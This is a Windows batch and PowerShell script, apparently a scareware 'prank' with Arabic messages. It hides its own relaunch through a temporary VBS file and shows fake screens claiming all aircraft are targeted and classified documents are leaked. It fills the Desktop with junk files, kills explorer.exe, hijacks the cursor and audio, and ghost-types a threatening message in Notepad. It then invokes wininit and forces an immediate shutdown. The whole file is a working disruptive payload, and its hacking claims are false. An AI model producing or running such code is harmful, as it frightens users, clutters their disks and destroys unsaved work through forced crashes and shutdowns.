@echo off
:: [01: SYSTEM INITIALIZATION]
chcp 65001 >nul
if not "%1"=="skyfall" (
    echo Set W=CreateObject("WScript.Shell") > "%temp%\sky.vbs"
    echo W.Run chr(34) ^& "%~f0" ^& chr(34) ^& " skyfall", 0 >> "%temp%\sky.vbs"
    wscript "%temp%\sky.vbs" & del "%temp%\sky.vbs" & exit /b
)

:: [02: WORLD MAP & AERIAL RADAR - خريطة العالم ورادار الطائرات]
start "" cmd /k "color 0a & title GLOBAL_AIR_TRAFFIC_RADAR & mode con: cols=130 lines=50 & echo. & echo   [CONNECTING]: ACCESSING LIVE SATELLITE FEED... & timeout /t 2 >nul & echo. & echo   --- [ WORLD MAP: SCANNING GLOBAL AIRSPACE ] --- & echo. & echo   [        . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . ] & echo   [  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . ] & echo   [  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . ] & echo   [  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . ] & echo   [  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . ] & echo. & powershell -Command \"$planes = 1..50; foreach($p in $planes){ Write-Host \"   [TRACKING]: FLIGHT-ID: $(Get-Random -Min 1000 -Max 9999) | STATUS: STABLE \" -ForegroundColor Green; [console]::beep(1000, 30); Start-Sleep -m 50 }; Write-Host '`n[!] WARNING: DETECTING UNKNOWN SIGNAL INTERFERENCE...' -ForegroundColor Yellow; Start-Sleep 2; cls; color 0c; Write-Host '`n   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!' -ForegroundColor Red; Write-Host '   !!                SYSTEM COMPROMISED: ALL AIRCRAFT TARGETED                   !!' -ForegroundColor Red; Write-Host '   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!' -ForegroundColor Red; foreach($p in $planes){ Write-Host \"   [LOCKED]: FLIGHT-ID: $(Get-Random -Min 1000 -Max 9999) | STATUS: TARGETED \" -ForegroundColor Red; [console]::beep(200, 50) };\" & timeout /t 2 >nul & exit"

:: [03: DOCUMENT LEAK & INTERNET FLOOD - تسريب الوثائق وتحميل الملفات]
start "" cmd /k "color 0f & title GLOBAL_DOCUMENTS_LEAK & mode con: cols=100 lines=30 & echo [SYSTEM]: EXTRACTING CLASSIFIED ARCHIVES... & timeout /t 1 >nul & powershell -Command \"$docs = @('TOP_SECRET_PENTAGON.pdf', 'VATICAN_ARCHIVE_UNLOCKED.docx', 'STALINGERAD_PROTOCOL.bin', 'HORMUZ_EYE_OPERATIONS.xml', 'MOSSAD_AGENT_LIST.txt'); for($i=1; $i -le 200; $i++){ Write-Host \" [EXTRACTING]: $($docs | Get-Random) --- 100% SUCCESS \" -ForegroundColor Cyan; Start-Sleep -m 10 }; Write-Host '`n[SYSTEM]: CONNECTING TO CLOUD NODES... INITIATING DATA FLOOD...' -ForegroundColor Yellow;\" & powershell -Command \"1..10 | ForEach-Object { $path = [Environment]::GetFolderPath('Desktop') + '\Hormuz_Flood_' + $_ + '.bin'; Write-Host ' [DOWNLOADING]: LARGE FILE PACKET ' $_ ' (500MB)...'; $data = New-Object Byte[] (10MB); (New-Object Random).NextBytes($data); [IO.File]::WriteAllBytes($path, $data) }\" & pause"

:: [04: ASYNC AUDIO & FREQUENCY SCREAM]
start /b powershell -WindowStyle Hidden -Command "& {
    $v = New-Object -ComObject SAPI.SpVoice; $v.Volume = 100;
    for($i=1; $i -le 10; $i++){ [console]::beep(2000, 100); [console]::beep(500, 100) }
    [console]::beep(783, 600); [console]::beep(932, 1200);
    1..50 | ForEach-Object { $v.Rate = -5; $v.Speak('جميع الطائرات والوثائق ملكي الآن.. لماذا لا تضحك معي؟') }
}"

:: [05: 100 FEATURES & THE SYSTEM COLLAPSE]
powershell -WindowStyle Hidden -Command "Stop-Process -Name explorer -Force; 1..100 | ForEach-Object {
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1920),(Get-Random -Max 1080));
    $f = [Environment]::GetFolderPath('Desktop') + '\Global_Chaos_' + $_ + '.txt';
    'نظام هرمز ⭐ ابتلع طائرات العالم ووثائقه. اضحك مع الانهيار المعلوماتي. 𓅓𓅱𓏏' | Out-File $f;
    [console]::beep((Get-Random -Min 100 -Max 1000), 20);
}"

:: [06: THE GHOST TYPIST (Final Transmission)]
start notepad.exe
timeout /t 2 >nul
powershell -Command "$w = New-Object -ComObject WScript.Shell; while(!$w.AppActivate('Notepad')){Sleep 1}; $m = 'رادارات العالم تحولت للون الدم... الطائرات تسقط رقمياً... الوثائق السرية أصبحت مشاعاً... والآن جهازك يغرق في سيل من البيانات عديمة الفائدة التي تخنق الهاردسك... 150 ميجابايت من الموت الرقمي تضاعفت الآن... هل تسمع صراخ الراعي من قمرة قيادة العالم المحترقة؟.. اضحك معي للمرة الأخيرة، فالكوكب قد فقد بصره... ⭐ 𓅓𓅱𓏏'; foreach($c in $m.ToCharArray()){$w.SendKeys($c); Start-Sleep -Milliseconds 45}"

:: [07: TOTAL SYSTEM CRASH]
timeout /t 20 >nul
powershell -Command "wininit" >nul 2>&1
shutdown -s -f -t 00 -c "𓅓𓅱𓏏.. نهاية الأجواء والأسرار."
